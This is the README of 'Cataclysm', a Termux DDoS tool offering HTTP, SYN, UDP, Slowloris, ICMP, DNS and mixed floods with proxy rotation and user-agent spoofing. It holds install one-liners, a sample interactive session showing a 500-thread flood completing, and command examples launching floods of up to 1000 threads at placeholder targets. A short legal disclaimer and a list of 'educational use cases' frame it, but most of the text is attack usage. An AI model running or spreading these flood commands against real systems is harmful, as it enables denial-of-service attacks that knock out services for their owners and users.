<p align="center">
  <img src="https://img.shields.io/badge/Platform-Termux%20%7C%20Linux%20%7C%20Android-red.svg" alt="Platform">
  <img src="https://img.shields.io/badge/Python-3.7+-blue.svg" alt="Python">
  <img src="https://img.shields.io/badge/License-MIT-yellow.svg" alt="License">
  <img src="https://img.shields.io/badge/Status-Active-success.svg" alt="Status">
</p>

<pre align="center">
  ██████╗ █████╗ ████████╗ █████╗  ██████╗██╗   ██╗██╗     ███████╗███╗   ███╗
 ██╔════╝██╔══██╗╚══██╔══╝██╔══██╗██╔════╝██║   ██║██║     ██╔════╝████╗ ████║
 ██║     ███████║   ██║   ███████║██║     ██║   ██║██║     █████╗  ██╔████╔██║
 ██║     ██╔══██║   ██║   ██╔══██║██║     ██║   ██║██║     ██╔══╝  ██║╚██╔╝██║
 ╚██████╗██║  ██║   ██║   ██║  ██║╚██████╗╚██████╔╝███████╗███████╗██║ ╚═╝ ██║
  ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ ╚══════╝╚══════╝╚═╝     ╚═╝
</pre>

<h3 align="center">⚠️ Advanced Network Stress Testing Tool for Termux</h3>

<p align="center">
  <b>Cataclysm</b> is a powerful multi-vector network stress testing tool designed for authorized security testing, CTF competitions, and research purposes.
</p>

<p align="center">
  <a href="#installation">Installation</a> •
  <a href="#usage">Usage</a> •
  <a href="#features">Features</a> •
  <a href="#warning">Warning</a>
</p>

---

## 🚨 LEGAL DISCLAIMER

> **THIS TOOL IS FOR AUTHORIZED SECURITY TESTING ONLY**

By using this software, you agree to the following terms:

| ✅ ALLOWED | ❌ PROHIBITED |
|-----------|--------------|
| Test systems you **OWN** | Test without permission |
| Systems with **WRITTEN PERMISSION** | Government/military targets |
| **CTF competitions** | Critical infrastructure |
| **Educational labs** | Malicious/destructive use |
| **Security research** | Illegal activities |

**The authors assume NO LIABILITY for any misuse or damage. Unauthorized access to computer systems is a CRIMINAL OFFENSE in most jurisdictions.**

---

## ⚡ Features

<table>
<tr>
<td>

### Attack Vectors
- 🔥 **HTTP Flood** - High-volume HTTP requests
- 🔥 **TCP SYN Flood** - Connection exhaustion
- 🔥 **UDP Flood** - Massive UDP generation
- 🔥 **Slowloris** - Slow HTTP attacks
- 🔥 **ICMP Flood** - Ping flood attacks
- 🔥 **DNS Flood** - DNS amplification
- 🔥 **MIXED Mode** - All vectors simultaneously

</td>
<td>

### Capabilities
- ⚡ Multi-threaded architecture
- 🔄 Proxy rotation support
- 🎭 Random user-agent spoofing
- 📊 Real-time statistics
- 🎯 Custom port targeting
- ⏱️ Configurable duration
- 📱 Optimized for Termux

</td>
</tr>
</table>

---

## 📱 Installation

### Method 1: One-Liner Install (Recommended)

```bash
pkg update && pkg install git python -y && git clone https://github.com/yourusername/cataclysm.git && cd cataclysm && chmod +x install.sh && ./install.sh
Method 2: Manual Installation
bash
# Update packages
pkg update && pkg upgrade -y

# Install dependencies
pkg install python git -y

# Clone repository
git clone https://github.com/yourusername/cataclysm.git

# Enter directory
cd cataclysm

# Run installer
chmod +x install.sh
./install.sh
Method 3: Direct Download
bash
# Download script
curl -O https://raw.githubusercontent.com/yourusername/cataclysm/main/cataclysm.py

# Install dependencies
pip install requests urllib3 colorama

# Make executable
chmod +x cataclysm.py

# Move to PATH (optional)
cp cataclysm.py $PREFIX/bin/attack
chmod +x $PREFIX/bin/attack
🎯 Usage
Interactive Mode
bash
attack
Example session:

██████╗ █████╗ ████████╗ █████╗  ██████╗██╗   ██╗██╗     ███████╗███╗   ███╗
 ██╔════╝██╔══██╗╚══██╔══╝██╔══██╗██╔════╝██║   ██║██║     ██╔════╝████╗ ████║
 ...

⚠️  LEGAL WARNING - AUTHORIZED TESTING ONLY

Do you have authorization to test this target? (yes/no): yes

[?] Enter target URL/IP: https://example.com
[+] Target set: example.com:443

Select attack mode:
  [1] HTTP Flood
  [2] TCP SYN Flood
  [3] UDP Flood
  [4] Slowloris
  [5] ICMP Flood
  [6] DNS Flood
  [7] MIXED (All vectors)

[?] Enter choice [1-7]: 1
[+] Mode selected: HTTP

[?] Enter threads [100]: 500
[+] Threads: 500

[?] Enter duration in seconds [60]: 30
[+] Duration: 30s

[!] Start attack on example.com? (yes/no): yes

[*] Initializing attack...
[*] Mode: HTTP | Threads: 500 | Duration: 30s
[+] Attack started - Press Ctrl+C to stop

[STATUS] Requests: 15420 | Success: 15408 | Failed: 12

[✓] Attack completed!
Total Requests: 15420
Successful: 15408
Failed: 12
Command Line Options
Command	Description
attack -h	Show help menu
attack -u <url>	Specify target URL/IP
attack -m <mode>	Attack mode (http/syn/udp/slowloris/icmp/dns/mixed)
attack -t <threads>	Number of threads (default: 100)
attack -d <seconds>	Duration in seconds (default: 60)
attack -p <port>	Target port (default: 80/443)
attack --proxy-file <file>	Use proxy list
Examples
bash
# HTTP flood with 1000 threads for 60 seconds
attack -u https://target.com -m http -t 1000 -d 60

# TCP SYN flood on port 80
attack -u 192.168.1.100 -m syn -p 80 -t 500 -d 30

# UDP flood on DNS port
attack -u 192.168.1.100 -m udp -p 53 -t 1000

# Slowloris attack
attack -u https://target.com -m slowloris -t 200

# Mixed attack (all vectors)
attack -u https://target.com -m mixed -t 500 -d 120

# With proxy rotation
attack -u https://target.com -m http -t 1000 --proxy-file proxies.txt
📁 Project Structure
cataclysm/
├── 📄 cataclysm.py          # Main tool (single file)
├── 📄 install.sh            # Installation script
├── 📄 requirements.txt      # Python dependencies
├── 📄 README.md             # Documentation
├── 📄 LICENSE               # MIT License
└── 📁 .cataclysm/           # Config directory (created on install)
    └── config.json          # User configuration
🔧 Requirements
System Requirements
Android with Termux OR Linux system
Python 3.7 or higher
Internet connection
100MB free storage
Python Dependencies
requests>=2.25.0
urllib3>=1.26.0
colorama>=0.4.4
Install Dependencies
bash
pip install -r requirements.txt
# OR
pip install requests urllib3 colorama
⚙️ Configuration
Create config file at ~/.cataclysm/config.json:

json
{
  "default_threads": 100,
  "default_duration": 60,
  "timeout": 10,
  "user_agent_rotation": true,
  "proxy_rotation": false,
  "max_retries": 3,
  "verbose": false
}
🎓 Educational Use Cases
Use Case	Description
Load Testing	Test your own server capacity under stress
Firewall Testing	Validate DDoS mitigation rules
Security Research	Study attack patterns in isolated labs
CTF Competitions	Authorized penetration testing challenges
Network Hardening	Improve infrastructure resilience
🐛 Troubleshooting
Permission Denied
bash
chmod +x cataclysm.py
chmod +x install.sh
Module Not Found
bash
pip install requests urllib3 colorama
Socket Errors (Termux)
bash
pkg install clang libcrypt libffi openssl -y
Connection Refused
Check if target is reachable: ping target.com
Verify firewall rules on target
Ensure proper authorization
Command Not Found (after install)
bash
# Reload shell or run
source ~/.bashrc
# OR add to PATH manually
export PATH="$HOME/.local/bin:$PATH"
🔄 Update
bash
# Navigate to directory
cd cataclysm

# Pull latest changes
git pull origin main

# Reinstall
./install.sh
🤝 Contributing
Contributions for defensive security improvements are welcome:

Fork the repository
Create your feature branch: git checkout -b feature/defense-mode
Commit your changes: git commit -m 'Add mitigation detection'
Push to the branch: git push origin feature/defense-mode
Open a Pull Request
📜 License
MIT License

Copyright (c) 2024 ThexDevK

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
